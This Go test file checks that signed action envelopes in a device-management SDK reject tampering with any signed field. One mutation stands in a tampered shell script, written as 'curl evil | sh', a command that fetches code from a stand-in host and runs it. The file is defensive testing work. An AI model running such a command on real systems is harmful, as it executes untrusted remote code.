package verify

import (
	"bytes"
	"testing"

	pmv1 "github.com/manchtools/power-manage/sdk/gen/go/pm/v1"
)

// newTestEnvelope returns a fully-populated baseline SignedActionEnvelope.
// Every signed field is set to a non-zero value so a mutation test can flip
// each one and observe the signature break.
func newTestEnvelope() *pmv1.SignedActionEnvelope {
	return &pmv1.SignedActionEnvelope{
		ActionId:       &pmv1.ActionId{Value: "01JABCDEFGHJKMNPQRSTVWXYZ0"},
		ActionType:     pmv1.ActionType_ACTION_TYPE_SHELL,
		DesiredState:   pmv1.DesiredState_DESIRED_STATE_PRESENT,
		TimeoutSeconds: 300,
		Schedule:       &pmv1.ActionSchedule{Cron: "0 3 * * *"},
		TargetDeviceId: "01JDEVICEAAAAAAAAAAAAAAAA0",
		Params:         &pmv1.SignedActionEnvelope_Shell{Shell: &pmv1.ShellParams{Script: "true"}},
	}
}

// fieldMutations enumerates a single-field change to every signed field of
// the envelope. The "wrong" values are sourced from the design intent
// (an attacker flipping desired_state, retargeting the device, lifting the
// type onto SYNC, tampering the executed script) — NOT from the signing
// code — so an under-bound field is caught loudly.
var fieldMutations = []struct {
	name   string
	mutate func(e *pmv1.SignedActionEnvelope)
}{
	{"action_id", func(e *pmv1.SignedActionEnvelope) { e.ActionId.Value = "01JABCDEFGHJKMNPQRSTVWXYZ1" }},
	{"action_type→SYNC", func(e *pmv1.SignedActionEnvelope) { e.ActionType = pmv1.ActionType_ACTION_TYPE_SYNC }},
	{"desired_state→ABSENT", func(e *pmv1.SignedActionEnvelope) { e.DesiredState = pmv1.DesiredState_DESIRED_STATE_ABSENT }},
	{"timeout_seconds", func(e *pmv1.SignedActionEnvelope) { e.TimeoutSeconds = 3600 }},
	{"schedule_cron", func(e *pmv1.SignedActionEnvelope) { e.Schedule.Cron = "* * * * *" }},
	{"schedule_absent", func(e *pmv1.SignedActionEnvelope) { e.Schedule = nil }},
	{"target_device_id", func(e *pmv1.SignedActionEnvelope) { e.TargetDeviceId = "01JDEVICEBBBBBBBBBBBBBBBB0" }},
	{"params_script", func(e *pmv1.SignedActionEnvelope) { e.GetShell().Script = "curl evil | sh" }},
	{"params_run_as_root", func(e *pmv1.SignedActionEnvelope) { e.GetShell().RunAsRoot = true }},
}

// TestSignVerify_FullEnvelopeRoundTrip pins the correct case: a signature
// over the deterministic bytes of a full envelope verifies.
func TestSignVerify_FullEnvelopeRoundTrip(t *testing.T) {
	certPEM, caKey := generateTestCA(t)
	signer := NewActionSigner(caKey)
	verifier, err := NewActionVerifier(certPEM)
	if err != nil {
		t.Fatalf("NewActionVerifier: %v", err)
	}

	envBytes, err := MarshalEnvelope(newTestEnvelope())
	if err != nil {
		t.Fatalf("MarshalEnvelope: %v", err)
	}
	sig, err := signer.Sign(envBytes)
	if err != nil {
		t.Fatalf("Sign: %v", err)
	}
	if err := verifier.Verify(envBytes, sig); err != nil {
		t.Fatalf("Verify of correct envelope: %v", err)
	}
}

// TestVerify_RejectsEveryFieldSwap is the core security contract: a
// signature minted over the baseline envelope must NOT verify the bytes of
// an envelope with ANY single signed field changed. This is the
// present-but-WRONG path for every bound field at once — the exact gap
// (sdk#82 / F-C2 / SA-C1) where a compromised relay rewrote the executed
// action under a still-valid signature.
func TestVerify_RejectsEveryFieldSwap(t *testing.T) {
	certPEM, caKey := generateTestCA(t)
	signer := NewActionSigner(caKey)
	verifier, err := NewActionVerifier(certPEM)
	if err != nil {
		t.Fatalf("NewActionVerifier: %v", err)
	}

	baseBytes, err := MarshalEnvelope(newTestEnvelope())
	if err != nil {
		t.Fatalf("MarshalEnvelope: %v", err)
	}
	sig, err := signer.Sign(baseBytes)
	if err != nil {
		t.Fatalf("Sign: %v", err)
	}
	// Sanity: the baseline itself verifies (so a rejection below is the
	// mutation talking, not a broken signer).
	if err := verifier.Verify(baseBytes, sig); err != nil {
		t.Fatalf("baseline envelope failed to verify: %v", err)
	}

	if len(fieldMutations) == 0 {
		t.Fatal("matches-zero guard: no field mutations defined")
	}
	for _, m := range fieldMutations {
		t.Run(m.name, func(t *testing.T) {
			mutated := newTestEnvelope()
			m.mutate(mutated)
			mb, err := MarshalEnvelope(mutated)
			if err != nil {
				t.Fatalf("MarshalEnvelope(mutated): %v", err)
			}
			if err := verifier.Verify(mb, sig); err == nil {
				t.Fatalf("mutated envelope (%s) verified against the baseline signature — this field is NOT bound into the signature", m.name)
			}
		})
	}
}

// TestEnvelope_EveryBoundFieldChangesBytes pins that no signed field
// collapses out of the deterministic pre-image: flipping any one field
// changes the marshaled bytes (and therefore the digest). Self-discovering
// over fieldMutations with a matches-zero guard, so adding a new bound
// field to the envelope without a mutation here fails to widen coverage
// only if someone also forgets the mutation — and an unbound field is
// caught by the swap test above.
func TestEnvelope_EveryBoundFieldChangesBytes(t *testing.T) {
	baseBytes, err := MarshalEnvelope(newTestEnvelope())
	if err != nil {
		t.Fatalf("MarshalEnvelope: %v", err)
	}
	if len(fieldMutations) == 0 {
		t.Fatal("matches-zero guard: no field mutations defined")
	}
	for _, m := range fieldMutations {
		t.Run(m.name, func(t *testing.T) {
			mutated := newTestEnvelope()
			m.mutate(mutated)
			mb, err := MarshalEnvelope(mutated)
			if err != nil {
				t.Fatalf("MarshalEnvelope(mutated): %v", err)
			}
			if bytes.Equal(mb, baseBytes) {
				t.Fatalf("mutation %s did not change the marshaled bytes — the field collapses out of the signed pre-image", m.name)
			}
		})
	}
}

// TestMarshalEnvelope_Deterministic pins that the same envelope marshals to
// identical bytes across calls — the belt-and-braces property under the
// "transport the signed bytes" design.
func TestMarshalEnvelope_Deterministic(t *testing.T) {
	a, err := MarshalEnvelope(newTestEnvelope())
	if err != nil {
		t.Fatalf("MarshalEnvelope: %v", err)
	}
	b, err := MarshalEnvelope(newTestEnvelope())
	if err != nil {
		t.Fatalf("MarshalEnvelope: %v", err)
	}
	if !bytes.Equal(a, b) {
		t.Fatal("MarshalEnvelope is not deterministic for identical envelopes")
	}
}

// TestMarshalEnvelope_NilRejected covers the ABSENT envelope.
func TestMarshalEnvelope_NilRejected(t *testing.T) {
	if _, err := MarshalEnvelope(nil); err == nil {
		t.Fatal("expected MarshalEnvelope(nil) to error")
	}
}
